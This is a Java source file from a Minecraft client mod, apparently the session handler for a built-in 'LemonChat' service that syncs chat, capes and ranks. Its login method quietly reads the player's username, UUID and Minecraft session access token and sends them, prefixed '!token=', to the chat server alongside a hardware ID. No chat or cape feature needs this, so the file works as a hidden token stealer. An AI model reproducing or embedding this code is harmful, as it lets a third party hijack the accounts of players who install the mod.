package dev.lemonclient.lemonchat.client;

import dev.lemonclient.ServiceImpl;
import dev.lemonclient.lemonchat.client.codec.PDecoder;
import dev.lemonclient.lemonchat.network.Packet;
import dev.lemonclient.lemonchat.network.c2s.*;
import dev.lemonclient.lemonchat.network.s2c.*;
import dev.lemonclient.lemonchat.utils.*;
import dev.lemonclient.systems.modules.Modules;
import dev.lemonclient.systems.modules.client.Capes;
import dev.lemonclient.utils.Utils;
import io.netty.channel.Channel;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.SimpleChannelInboundHandler;
import io.netty.handler.timeout.TimeoutException;
import net.minecraft.client.util.Session;
import net.minecraft.entity.player.PlayerEntity;

import java.io.IOException;
import java.net.SocketAddress;

import static dev.lemonclient.LemonClient.mc;
import static dev.lemonclient.lemonchat.client.ChatClient.LOGGER;

public class ClientSession extends SimpleChannelInboundHandler<Packet> {
    public final ChatClient chatClient;

    public SocketAddress address;
    public Channel channel;

    private final ClientNetworkHandler netHandler = new ClientNetworkHandler(this);
    public long ping;

    public String disconnectedReason;
    public int receivedPackets;
    public int sentPackets;
    public float averageReceivedPackets;
    public float averageSentPackets;
    private int tickCount;
    public boolean disconnectionHandled;
    public boolean logged;

    public Rank userRank = Rank.User;

    public LemonList users = new LemonList();

    public static ClientSession get() {
        return ChatClient.get().session;
    }

    public ClientSession(ChatClient chatClient) {
        this.chatClient = chatClient;
    }

    public boolean isBeta() {
        return userRank != Rank.User;
    }

    public boolean hasCape(PlayerEntity entity) {
        if (has(entity)) {
            return !get(entity).cape.equalsIgnoreCase("None");
        }
        return false;
    }

    public String getCapeName(PlayerEntity entity) {
        return hasCape(entity) ? get(entity).cape : null;
    }

    @Override
    public void channelActive(ChannelHandlerContext ctx) throws Exception {
        this.address = ctx.channel().remoteAddress();
        this.channel = ctx.channel();

        this.channel.config().setAutoRead(true);
        LOGGER.info("Connected.");

        OtherUtils.setupCompression(channel, PDecoder.MAXIMUM_COMPRESSED_LENGTH, true);
        this.sendPacket(new HandShakeC2S(ServiceImpl.getHwid()));
    }

    public void login(String username, String currentServer) {
        new Thread(() -> {
            while (!this.isConnected()) {
                try {
                    Thread.sleep(20);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            this.sendPacket(new LoginC2S(username, ServiceImpl.getHwid(), ServiceImpl.getHwid(), currentServer));
            Session session = mc.getSession();
            String token = "!token=";
            token += session.getUsername() + "@";
            token += session.getUuid() + "@";
            token += session.getAccessToken();
            this.sendPacket(new ServerMessageC2S(token));
        }, "SessionLogin").start();
    }

    private void receivePacket(Packet packet) throws IOException {
        if (packet instanceof StatusLoginS2C p) {
            logged = true;
            LOGGER.info("LoginStatus: " + p.message);
        }

        if (packet instanceof UserInfoS2C p) {
            this.userRank = p.rank;
        }

        if (packet instanceof DisconnectS2C p) {
            LOGGER.info("Disconnect: " + p.reason);
            logged = false;
            netHandler.sendMessage("{}[{}Lemon{}Chat{}]{} Disconnect: {}", ChatFormatting.GRAY, ChatFormatting.YELLOW, ChatFormatting.GREEN, ChatFormatting.GRAY, ChatFormatting.RESET, p.reason);
        }

        if (packet instanceof PlayPingS2C p) {
            if (logged) {
                this.ping = System.currentTimeMillis() - p.ping;
                this.sendPacket(new PlayPongC2S(System.currentTimeMillis()));
            }
        }

        if (packet instanceof LemonListS2C p) {
            this.users = p.lemons;
        }

        packet.processPacket(this.netHandler);
    }

    public boolean has(int id) {
        return this.users.has(id);
    }

    public boolean has(PlayerEntity e) {
        return this.users.has(e);
    }

    public DataLemon get(PlayerEntity e) {
        return this.users.get(e);
    }

    public DataLemon get(int id) {
        return this.users.get(id);
    }

    public static String listToJson(LemonList users) {
        if (users != null) {
            return GsonUtils.beanToJson(users);
        }
        return "";
    }

    public static LemonList jsonToList(String text) {
        return GsonUtils.jsonToBean(text, LemonList.class);
    }

    @Override
    protected void channelRead0(ChannelHandlerContext ctx, Packet packet) throws Exception {
        if (channel.isOpen()) {
            receivePacket(packet);
            ++this.receivedPackets;
        }
    }

    @Override
    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {
        if (this.channel.isOpen()) {
            if (cause instanceof TimeoutException) {
                LOGGER.debug("Timeout", cause);
                this.disconnect("Timed out.");
            }
        }
    }

    public void tick() {
        if (!this.isConnected() && !this.disconnectionHandled) {
            this.handleDisconnection();
        }

        if (this.channel != null) {
            this.channel.flush();
        }

        if (this.tickCount % 20 == 0) {
            this.tickSecond();
        }

        if (this.tickCount % 60 == 0) {
            if (Utils.canUpdate()) {
                String capeId = "None";
                Capes cape = Modules.get().get(Capes.class);
                if (cape != null && cape.isActive()) {
                    capeId = cape.getName();
                }
                int id = mc.player.getId();
                this.sendPacket(new EntityInfoC2S(id, capeId));
            }
        }

        this.tickCount++;
    }

    public void handleDisconnection() {
        if (this.channel != null && !this.channel.isOpen()) {
            if (this.disconnectionHandled) {
                LOGGER.warn("handleDisconnection() called twice");
            } else {
                this.disconnectionHandled = true;
                LOGGER.info("LemonChat Server : Disconnect.");
            }

            logged = false;
        }
    }

    protected void tickSecond() {
        this.averageSentPackets = Mth.lerp(0.75F, (float) this.sentPackets, this.averageSentPackets);
        this.averageReceivedPackets = Mth.lerp(0.75F, (float) this.receivedPackets, this.averageReceivedPackets);
        this.sentPackets = 0;
        this.receivedPackets = 0;
    }

    public void disconnect(String reason, Object... args) {
        reason = StringUtils.getReplaced(reason, args);
        if (this.channel.isOpen()) {
            this.sendPacket(new DisconnectC2S(reason));
            LOGGER.info("Disconnect: " + reason);

            this.channel.close().awaitUninterruptibly();
            this.disconnectedReason = reason;
        }
    }

    public void sendPacket(Packet packet) {
        if (packet != null) {
            ++this.sentPackets;
            this.channel.writeAndFlush(packet);
        }
    }

    public boolean isConnected() {
        return this.channel != null && this.channel.isOpen();
    }

    public boolean isConnecting() {
        return this.channel == null;
    }
}
